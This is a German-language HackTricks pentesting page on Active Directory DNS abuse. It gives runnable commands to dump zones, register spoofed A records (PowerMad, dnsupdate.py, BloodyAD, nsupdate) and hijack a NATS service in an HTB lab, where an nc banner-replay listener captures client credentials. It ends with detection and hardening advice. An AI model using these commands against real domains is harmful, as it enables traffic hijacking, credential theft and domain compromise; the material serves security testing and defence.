# AD-DNS-Einträge

{{#include ../../banners/hacktricks-training.md}}

Standardmäßig kann **jeder Benutzer** in Active Directory **alle DNS-Einträge** in den DNS-Zonen der Domäne oder Gesamtstruktur enumerieren, ähnlich wie bei einem Zone Transfer (Benutzer können die untergeordneten Objekte einer DNS-Zone in einer AD-Umgebung auflisten).

Das Tool [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) ermöglicht die **Enumeration** und den **Export** **aller DNS-Einträge** in der Zone zu Recon-Zwecken in internen Netzwerken.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (April 2025) bietet JSON-/Greppable-Ausgabe (`--json`), multithreaded DNS-Auflösung und Unterstützung für TLS 1.2/1.3 beim Verbindungsaufbau zu LDAPS  

Weitere Informationen findest du unter [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Erstellen / Ändern von Records (ADIDNS spoofing)

Da die Gruppe **Authenticated Users** standardmäßig über **Create Child** in der Zonen-DACL verfügt, kann jedes Domänenkonto (oder Computerkonto) zusätzliche Records registrieren. Dies kann zum Hijacking von Traffic, zur Erzwingung von NTLM-Relays oder sogar zur vollständigen Kompromittierung der Domäne genutzt werden.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py wird mit Impacket ≥0.12.0 ausgeliefert)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Gängige Angriffsgrundlagen

1. **Wildcard record** – `*.<zone>` macht den AD-DNS-Server zu einem unternehmensweiten Responder, ähnlich wie LLMNR/NBNS-Spoofing. Dies lässt sich missbrauchen, um NTLM-Hashes abzufangen oder sie an LDAP/SMB weiterzuleiten. (WINS-Lookup muss deaktiviert sein.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – `wpad` hinzufügen (oder einen **NS**-Record, der auf einen Angreifer-Host verweist, um die Global-Query-Block-List zu umgehen) und ausgehende HTTP-Anfragen transparent über einen Proxy leiten, um Zugangsdaten abzugreifen. Microsoft hat die Wildcard-/DNAME-Bypasses gepatcht (CVE-2018-8320), aber **NS-Records funktionieren weiterhin**.<sup>[[1]](#references)</sup>    
3. **Übernahme veralteter Einträge** – die IP-Adresse beanspruchen, die zuvor zu einer Workstation gehörte. Der zugehörige DNS-Eintrag wird weiterhin aufgelöst, sodass resource-based constrained delegation oder Shadow-Credentials-Angriffe möglich sind, ohne DNS überhaupt zu verändern.    
4. **DHCP → DNS-Spoofing** – bei einer standardmäßigen Windows-DHCP+DNS-Bereitstellung kann ein nicht authentifizierter Angreifer im selben Subnetz jeden vorhandenen A-Record überschreiben (einschließlich Domain Controllern), indem er gefälschte DHCP-Anfragen sendet, die dynamische DNS-Updates auslösen (Akamai „DDSpoof“, 2023). Dadurch entsteht eine Man-in-the-Middle-Position für Kerberos/LDAP, die zur vollständigen Übernahme der Domäne führen kann.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – den `dNSHostName` eines Maschinenkontos ändern, das du kontrollierst, einen passenden A-Record registrieren und anschließend ein Zertifikat für diesen Namen anfordern, um den DC zu imitieren. Tools wie **Certipy** oder **BloodyAD** automatisieren den Ablauf vollständig.  

Ein AD-DNS-Record mit [serialisierten Zielinformationen](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) kann Teil einer bedingten Relay-Kette sein: Der Aufrufer benötigt Rechte zum Erstellen von Records, einen Coercion-Pfad, durch den sich der Zielcomputer bei diesem Namen authentifiziert, sowie ein Relay-Ziel, das die resultierende Authentifizierung akzeptiert. Bewerte das Zielprotokoll separat; SMB-Signing bei der eingehenden Verbindung legt nicht automatisch fest, ob ein HTTPS-WinRM-Ziel das Relay akzeptiert. Patch-Stand, Namensverarbeitung, Extended Protection und Dienstkonfiguration können das Ergebnis beeinflussen.

---

### Hijacking interner Dienste über veraltete dynamische Records (NATS-Fallstudie)

Wenn dynamische Updates für alle authentifizierten Benutzer offenstehen, **kann ein abgemeldeter Dienstname erneut beansprucht und auf eine Angreifer-Infrastruktur umgeleitet werden**. Der Mirage-HTB-DC gab den Hostnamen `nats-svc.mirage.htb` nach dem DNS-Scavenging preis, sodass jeder Benutzer mit niedrigen Berechtigungen Folgendes tun konnte:<sup>[[3]](#references)</sup>

1. **Bestätigen, dass der Record fehlt**, und die SOA mit `dig` ermitteln:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Den Eintrag** über eine externe/VPN-Schnittstelle neu erstellen, die sie kontrollieren:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Impersonate den Klartextdienst**. NATS-Clients erwarten ein `INFO { ... }`-Banner, bevor sie Zugangsdaten senden. Daher reicht es aus, ein legitimes Banner vom echten Broker zu kopieren, um Geheimnisse abzugreifen:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Jeder Client, der den gekaperten Namen auflöst, leakt sofort seinen JSON-`CONNECT`-Frame (einschließlich `"user"`/`"pass"`) an den Listener. Wird die offizielle Binärdatei `nats-server -V` auf dem Angreifer-Host ausgeführt, die Log-Redaktion deaktiviert oder die Sitzung einfach mit Wireshark mitgeschnitten, erhält man dieselben Klartext-Anmeldedaten, da TLS optional war.

4. **Mit den erbeuteten Creds pivoten** – in Mirage gewährte das gestohlene NATS-Konto Zugriff auf JetStream. Dadurch wurden historische Authentifizierungsereignisse offengelegt, die wiederverwendbare AD-Benutzernamen und -Passwörter enthielten.

Dieses Muster gilt für jeden AD-integrierten Dienst, der auf ungesicherte TCP-Handshakes setzt (HTTP-APIs, RPC, MQTT usw.): Sobald der DNS-Eintrag gekapert wurde, wird der Angreifer zum Dienst.

---

## Erkennung & Härtung

* Verweigere **Authenticated Users** das Recht *Alle untergeordneten Objekte erstellen* auf sensiblen Zonen und delegiere dynamische Updates an ein dediziertes, von DHCP verwendetes Konto.
* Wenn dynamische Updates erforderlich sind, setze die Zone auf **Nur sichere Updates** und aktiviere **Name Protection** in DHCP, damit nur das Besitzer-Computerobjekt seinen eigenen Eintrag überschreiben kann.
* Überwache die DNS-Server-Ereignis-IDs 257/252 (dynamische Updates), 770 (Zonentransfer) und LDAP-Schreibvorgänge nach `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blockiere gefährliche Namen (`wpad`, `isatap`, `*`) mit einem absichtlich harmlosen Eintrag oder über die Global Query Block List.
* Halte DNS-Server gepatcht – beispielsweise erreichten die RCE-Schwachstellen CVE-2024-26224 und CVE-2024-26231 **CVSS 9.8** und sind aus der Ferne gegen Domain Controller ausnutzbar.  

## References

- [1] [ADIDNS erneut betrachtet – WPAD, GQBL und mehr](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [DNS-Einträge fälschen durch Missbrauch dynamischer DNS-Updates von DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Verkettung von NFS-Leaks, Missbrauch von Dynamic DNS, Diebstahl von NATS-Anmeldedaten, JetStream-Secrets und Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [In die Zone gelangen: Active-Directory-DNS mit adidnsdump auslesen](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
